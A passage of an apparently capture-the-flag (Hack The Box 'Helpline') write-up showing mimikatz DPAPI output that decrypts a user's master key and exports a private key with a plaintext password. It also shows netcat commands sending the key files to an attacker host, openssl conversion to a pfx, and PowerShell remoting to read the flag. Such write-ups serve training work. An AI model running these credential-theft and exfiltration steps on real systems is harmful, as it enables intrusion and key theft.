0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007</span><br><span class="line">a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2</span><br><span class="line">6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68</span><br><span class="line">8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf0307</span><br><span class="line">b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$</span><br><span class="line">bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$</span><br><span class="line">65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$</span><br><span class="line">7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$</span><br><span class="line">bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330$</span><br><span class="line">f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899$</span><br><span class="line">75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac</span><br><span class="line">b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f</span><br><span class="line">e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c</span><br><span class="line">6a</span><br><span class="line">    dwSignLen          : 00000040 - 64</span><br><span class="line">    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596                                                         </span><br><span class="line"></span><br><span class="line">  pExExportFlag      :</span><br><span class="line">  **BLOB**</span><br><span class="line">    dwVersion          : 00000001 - 1</span><br><span class="line">    guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">    dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">    guidMasterKey      : &#123;2f452fc5-c6d2-4706-a4f7-1cd6b891c017&#125;</span><br><span class="line">    dwFlags            : 00000000 - 0 ()</span><br><span class="line">    dwDescriptionLen   : 00000018 - 24</span><br><span class="line">    szDescription      : Export Flag</span><br><span class="line">    algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">    dwSaltLen          : 00000020 - 32</span><br><span class="line">    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a</span><br><span class="line">    dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">    pbHmackKey         :</span><br><span class="line">    algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    dwAlgHashLen       : 00000200 - 512</span><br><span class="line">    dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983</span><br><span class="line">    dwDataLen          : 00000010 - 16</span><br><span class="line">    pbData             : 3766e1ec88316997e9aeb13d847c396e</span><br><span class="line">    dwSignLen          : 00000040 - 64</span><br><span class="line">    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800                                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # dpapi::masterkey &#x2F;in:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017&quot; &#x2F;password:!zaq1234567890pl!99                </span><br><span class="line">**MASTERKEYS**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  szGuid             : &#123;2f452fc5-c6d2-4706-a4f7-1cd6b891c017&#125;</span><br><span class="line">  dwFlags            : 00000005 - 5</span><br><span class="line">  dwMasterKeyLen     : 000000b0 - 176</span><br><span class="line">  dwBackupKeyLen     : 00000090 - 144</span><br><span class="line">  dwCredHistLen      : 00000014 - 20</span><br><span class="line">  dwDomainKeyLen     : 00000000 - 0</span><br><span class="line">[masterkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : 80ba00dd649b0237d847b3c30d155a36</span><br><span class="line">    rounds           : 00001f40 - 8000</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : 9dd4c16fe8fc2375858f5fdc643770d26bd55c48fec169c28d901820ebe28ea0d6845d2867e3a2bb3b763108da7fb69b5203d8a73ffb22b44d21949150546a0387e2a7d05a18b877f06d0dfe8baf89fc4029070bd5f0a5ac9cbe2379dda7facf6a2455ed8dae4dacd51b981b147ebddf12da71d4b22d675925ed576d92247aac8a39eb5080607382ecf2c3e9ea92ce2f</span><br><span class="line"></span><br><span class="line">[backupkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : bce3d5c5463ff84017a1f9eabfb4b9ea</span><br><span class="line">    rounds           : 00001f40 - 8000</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : 6d4e0478c22d0a52f7bc66249a0c6a7071991300dd122c4bee0aa31b72273938f336a44d08a15a2effcb2e5787069ab153e666dcd518b7af23e168577f56739f68c42e057508d7d5ffb16bf18d9e720873e644152d461d83356f500f4b8efbbcc9ee073a718134111f8b2708bf0f1645</span><br><span class="line"></span><br><span class="line">[credhist]</span><br><span class="line">  **CREDHIST INFO**</span><br><span class="line">    dwVersion        : 00000003 - 3</span><br><span class="line">    guid             : &#123;0cc50e66-d2f0-43dc-97a5-5edac908aef9&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auto SID from path seems to be: S-1-5-21-3107372852-1132949149-763516304-1011</span><br><span class="line"></span><br><span class="line">[masterkey] with password: !zaq1234567890pl!99 (normal user)</span><br><span class="line">  key : 1d0cea3fd8c42574c1a286e3938e6038d3ed370969317fb413b339f8699dcbf7f563b42b72ef45b394c61f73cc90c62076ea847f4c1e1fee3947f381d56d0f02                                                                          </span><br><span class="line">  sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb</span><br><span class="line"></span><br><span class="line">mimikatz # dpapi::capi &#x2F;in:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot; &#x2F;masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb            </span><br><span class="line">**KEY (capi)**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  dwUniqueNameLen    : 00000025 - 37</span><br><span class="line">  dwSiPublicKeyLen   : 00000000 - 0</span><br><span class="line">  dwSiPrivateKeyLen  : 00000000 - 0</span><br><span class="line">  dwExPublicKeyLen   : 0000011c - 284</span><br><span class="line">  dwExPrivateKeyLen  : 00000650 - 1616</span><br><span class="line">  dwHashLen          : 00000014 - 20</span><br><span class="line">  dwSiExportFlagLen  : 00000000 - 0</span><br><span class="line">  dwExExportFlagLen  : 000000fc - 252</span><br><span class="line">  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d</span><br><span class="line">  pHash              : 0000000000000000000000000000000000000000     </span><br><span class="line">  pSiPublicKey       :    </span><br><span class="line">  pSiPrivateKey      :    </span><br><span class="line">  pSiExportFlag      :                        </span><br><span class="line">  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543</span><br><span class="line">62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e</span><br><span class="line">51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                          </span><br><span class="line">  pExPrivateKey      :</span><br><span class="line">  </span><br><span class="line">  **BLOB**</span><br><span class="line">    dwVersion          : 00000001 - 1</span><br><span class="line">    guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">    dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">    guidMasterKey      : &#123;2f452fc5-c6d2-4706-a4f7-1cd6b891c017&#125;</span><br><span class="line">    dwFlags            : 00000000 - 0 ()</span><br><span class="line">    dwDescriptionLen   : 0000002c - 44</span><br><span class="line">    szDescription      : CryptoAPI Private Key</span><br><span class="line">    algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">    dwSaltLen          : 00000020 - 32</span><br><span class="line">    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc</span><br><span class="line">    dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">    pbHmackKey         :</span><br><span class="line">    algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    dwAlgHashLen       : 00000200 - 512</span><br><span class="line">    dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1</span><br><span class="line">    dwDataLen          : 00000550 - 1360</span><br><span class="line">    pbData             : 0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007</span><br><span class="line">a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2</span><br><span class="line">6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68</span><br><span class="line">8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf030$</span><br><span class="line">b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$</span><br><span class="line">bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$</span><br><span class="line">65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$</span><br><span class="line">7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$</span><br><span class="line">bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330f</span><br><span class="line">f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899c</span><br><span class="line">75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac</span><br><span class="line">b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f</span><br><span class="line">e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c</span><br><span class="line">6a</span><br><span class="line">    dwSignLen          : 00000040 - 64</span><br><span class="line">    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596</span><br><span class="line"></span><br><span class="line">  pExExportFlag      :</span><br><span class="line">  **BLOB**</span><br><span class="line">    dwVersion          : 00000001 - 1</span><br><span class="line">    guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">    dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">    guidMasterKey      : &#123;2f452fc5-c6d2-4706-a4f7-1cd6b891c017&#125;</span><br><span class="line">    dwFlags            : 00000000 - 0 ()</span><br><span class="line">    dwDescriptionLen   : 00000018 - 24</span><br><span class="line">    szDescription      : Export Flag</span><br><span class="line">    algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">    dwSaltLen          : 00000020 - 32</span><br><span class="line">    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a</span><br><span class="line">    dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">    pbHmackKey         :</span><br><span class="line">    algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    dwAlgHashLen       : 00000200 - 512</span><br><span class="line">    dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983</span><br><span class="line">    dwDataLen          : 00000010 - 16</span><br><span class="line">    pbData             : 3766e1ec88316997e9aeb13d847c396e</span><br><span class="line">    dwSignLen          : 00000040 - 64</span><br><span class="line">    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800</span><br><span class="line"></span><br><span class="line">Decrypting AT_EXCHANGE Export flags:</span><br><span class="line"> * volatile cache: GUID:&#123;2f452fc5-c6d2-4706-a4f7-1cd6b891c017&#125;;KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   </span><br><span class="line"> * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb</span><br><span class="line">01000000</span><br><span class="line">Decrypting AT_EXCHANGE Private Key:</span><br><span class="line"> * volatile cache: GUID:&#123;2f452fc5-c6d2-4706-a4f7-1cd6b891c017&#125;;KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   </span><br><span class="line"> * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb</span><br><span class="line">525341320801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef6363754362f219c555d7feb1b7423f9</span><br><span class="line">d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e51d19fa1bf7d748e524919d</span><br><span class="line">abdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b600000000000000006b686e241f8ac960bd719549bd40384959b682321394b15dd99070665bb0b3177</span><br><span class="line">4d9a149b5b097b7ab965763e5592eeae40896efd89c92ef20519b995ac65c9258a8973e021efb6255514a42e5af7aa7ad028349c8ba92b61e2cb52ea740f15cdabf14f23f1aea32b3ab47c4ce72be3920314e8096fda33dd978fee18c79fde000000000d3d94b2498e1</span><br><span class="line">0b913cc5c026ee19c672eaafe6eab8bb92b5c45b22be438d469a197a08b0ce230a926bf2418256c8397d5630de1ff89275cd1fa2ed1170b3408e697a505b61262a44db96763a532322a2cc070520af4f4539c4f44754513932481b76bd5765a7196cac8bf9fe9fad0d7</span><br><span class="line">4460ece6677a99096b565705cc3de84cf00000000ff61d229009652074adf5045582172ff5638b61254e044b4714eb7f7261c019415a30c6e8bd1fa1d1fbc1ef0620394594d83ab2796416b80acb40ca77d7cccc1eca5eef9c6e0892e144defb31f6f3b20a69201485e</span><br><span class="line">7058d72851f697307898c3957a3bb0bf0e65f1beb40b182c66627138fe5c264231d16d013bac509b9c937d00000000c7fc63389c2c563d9c380fc70de0774025d8f4a7ee15dd8c69de0ae2e5a8f881f939ade966c736ef7188374a9730ddfc99f5791d59ca8de461fbb</span><br><span class="line">44a5326a29aee91d5f0eb903eb9ede3a76b03df9929b2afec0766e7dca2f4b25f4e370d95759db76a89c42812ba2c1a670a6727d8424f62c344f87dbf0b2686959335811e0e00000000505ecc240eefef332854553feabb019fa075baa1148953d142582f82d6cf1fc0</span><br><span class="line">72267bd574d0d665dfafb8c9be8afd434f2250a840c6a0f80be883c70dafea4b6a1a23c29534a49188fa9c1c7df45788da79ced400db29799a057938fa3059f1ded01cbb8635dc3579ded3e9c16fc2d4bb7085ddda143c16657e24c2876c88bc00000000e1f11d6633a</span><br><span class="line">644709fa252d8614531d2e8da61fc078ae8bfd91ce60582c914873d9dc6825bdd453d00594e3e286f1b843dd7154a8a67378272b2fce204162c87cb80320bd8a7e31bf646ee6b54635a4242abddef81876be6d33d9ffa356fb306c364c902ba52a43d9776d9c88d8de4</span><br><span class="line">fcf11fea675cc8c1a1dcc79da2e3ec931f8fe342fecef6c883649e86cfda7d34cc01e0a128424df5d3a6f17dbea80983a6b4e14cb19c5a039b290bcdfe4c48dce945985f1c9d3464fec51b26b59d8ceacb52f5030d322566de54d42806900343b47d03ba31f67b60495</span><br><span class="line">73ededc194c1be20f2a02700dc25de6e18b26d1dcc7b189c1822e6d2370c1ecc8af73e924000f2c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">        Exportable key : YES</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Private export : OK - &#39;raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk&#39;</span><br></pre></td></tr></table></figure>
<p>I used <code>nc</code> to transfer the <code>der</code> and <code>pvk</code> files to my box :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color&gt;nc.exe -w 3 10.10.xx.xx 1440 &lt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der</span><br><span class="line">nc.exe -w 3 10.10.xx.xx 1440 &lt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\spool\drivers\color&gt;nc.exe -w 3 10.10.xx.xx 1440 &lt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk        </span><br><span class="line">nc.exe -w 3 10.10.xx.xx 1440 &lt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\spool\drivers\color&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline&#x2F;tolu# nc -lp 1440 &gt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline&#x2F;tolu# ls -la                                                                    </span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug 16 16:50 .</span><br><span class="line">drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..</span><br><span class="line">-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline&#x2F;tolu# nc -lp 1440 &gt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk                                                             </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline&#x2F;tolu# ls -la                                         </span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug 16 16:51 .</span><br><span class="line">drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..</span><br><span class="line">-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der</span><br><span class="line">-rw-r--r-- 1 root root 1196 Aug 16 16:51 raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk</span><br></pre></td></tr></table></figure>
<p>Then I created the <code>pfx</code> with <code>openssl</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline&#x2F;tolu# openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline&#x2F;tolu# openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem</span><br><span class="line">writing RSA key</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline&#x2F;tolu# openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure>
<p>And finally I imported it and I was able to read the flag :<br><img src="/images/hackthebox/helpline/26.png" alt=""><br>I found later that I could also use <code>Invoke-Command</code> as <code>tolu</code> and I would be able to read the flag, still don’t know why I couldn’t read it from a <code>winrm</code> session.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\System32\spool\drivers\color&gt; <span class="variable">$username</span> = <span class="string">"Helpline\tolu"</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">"Helpline\tolu"</span></span><br><span class="line">PS C:\Windows\System32\spool\drivers\color&gt; <span class="variable">$password</span> = <span class="string">"!zaq1234567890pl!99"</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">"!zaq1234567890pl!99"</span></span><br><span class="line">PS C:\Windows\System32\spool\drivers\color&gt; <span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line">PS C:\Windows\System32\spool\drivers\color&gt; <span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span></span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span></span><br><span class="line">PS C:\Windows\System32\spool\drivers\color&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> HELPLINE <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-Authentication</span> credssp <span class="literal">-ScriptBlock</span> &#123; type C:\Users\tolu\Desktop\user.txt &#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> HELPLINE <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-Authentication</span> credssp <span class="literal">-ScriptBlock</span> &#123; type C:\Users\tolu\Desktop\user.txt &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/helpline/27.png" alt=""><br>We got user.</p>
<h2 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h2><p>There was a file called <code>admin-pass.xml</code> in <code>C:\Users\leo\Desktop</code></p>
